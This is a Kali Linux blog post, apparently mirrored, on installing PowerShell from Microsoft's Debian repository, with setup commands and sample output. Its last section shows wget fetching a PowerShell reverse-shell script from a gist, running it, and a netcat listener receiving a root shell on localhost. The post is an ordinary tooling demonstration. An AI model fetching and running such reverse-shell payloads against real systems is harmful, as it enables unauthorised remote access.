---
title: "Installing PowerShell on Kali Linux"
date: Wed, 06 Jun 2018 00:00:00 +0000
draft: false
type: posts
---
# Installing PowerShell on Kali Linux

https://www.kali.org/blog/installing-powershell-on-kali-linux/images/powershell-on-kali-linux-v3.jpg



UPDATE NOV 2019 This post is out of date as of 2019 as powershell has been added to the primary repos. Just do a: apt update &amp;&amp; apt -y install powershell And you will have powershell on your system. Old Post You may already be aware that you can safely add external repositories to your

**UPDATE NOV 2019**
-------------------

This post is out of date as of 2019 as powershell has been added to the primary repos. Just do a:

```sh
apt update && apt -y install powershell
```

And you will have powershell on your system.

### Old Post

You may already be aware that you can safely [add external repositories to your Kali Linux installation](https://www.kali.org/blog/advanced-package-management-in-kali-linux/) but you may not be aware that one of the many repositories available online includes one from Microsoft that includes [PowerShell](https://github.com/PowerShell/PowerShell). The repository is for Debian but its packages install perfectly well on Kali, as we will show in this post.

### PowerShell Package Installation in Kali

We begin by installing the necessary dependencies, most of which should already be installed in your Kali installation by default:

```sh
apt update && apt -y install curl gnupg apt-transport-https
```

Next, we need to download and add the public repository GPG key so APT will trust the packages and alert you to any issues with package signatures:

```sh
curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -
```

With the GPG key added, we proceed to add the Microsoft package repository to its own package list file under **/etc/apt/sources.list.d/** and update the list of available packages:

```sh
echo "deb [arch=amd64] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main" > /etc/apt/sources.list.d/powershell.list
apt update
```

Finally, we proceed to install the powershell package:

```sh
apt -y install powershell
```

### Running PowerShell

When the package installation completes, running **pwsh** will start up PowerShell, presenting us with the familiar “PS” prompt:

```console
root@kali:~# pwsh
PowerShell v6.1.0-preview.2
Copyright (c) Microsoft Corporation. All rights reserved.
https://aka.ms/pscore6-docs
Type 'help' to get help.
PS /root>
```

If you’re new to PowerShell, one of the first things you will likely want to do is update the built-in help, which can be done by running the **Update-Help** Cmdlet. This may take a little while to complete but only really needs to be run once in a rare while:

```console
PS /root> Update-Help
Updating Help for module Microsoft.PowerShell.Utility
Locating Help Content...
```

As you might expect, you won’t find all the commands you’re used to when using PowerShell on Windows but all of the core modules are present and the code is under constant development and improvement:

```console
PS /root> Get-Process -Name gnome*
NPM(K) PM(M) WS(M) CPU(s) Id SI ProcessName
------ ----- ----- ------ -- -- -----------
0 0.00 5.71 0.03 1073 072 gnome-keyring-d
0 0.00 9.80 0.19 659 649 gnome-session-b
0 0.00 13.72 0.36 1089 080 gnome-session-b
0 0.00 110.06 3.36 778 649 gnome-shell
0 0.00 277.15 27.85 1170 080 gnome-shell
0 0.00 11.77 0.09 1199 075 gnome-shell-cal
0 0.00 77.79 4.58 1381 080 gnome-software
0 0.00 36.58 2.03 1646 646 gnome-terminal-
```

One of the surprising things you _can_ do however, is use PowerShell to send a reverse shell to a Netcat listener. We came across a [small PowerShell reverse shell](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1) online and much to our surprise, it happily connected back to our listener:

```console
root@kali:~# pwsh
PowerShell v6.1.0-preview.2
Copyright (c) Microsoft Corporation. All rights reserved.
https://aka.ms/pscore6-docs
Type 'help' to get help.
PS /root> wget -q https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
PS /root> ./mini-reverse.ps1
────────────────────────────────────────────────────────────────────────────────
root@kali:~# nc -lvnp 413
listening on [any] 413 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59006
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux kali 4.15.0-kali3-amd64 #1 SMP Debian 4.15.17-1kali1 (2018-04-25) x86_64 GNU/Linux
```

We think it’s remarkable that, not only did Microsoft Open-source PowerShell, they’ve also been constantly updating and improving it, and having a public package repository for it makes installation a breeze.

#### [Source](https://www.kali.org/blog/installing-powershell-on-kali-linux/)

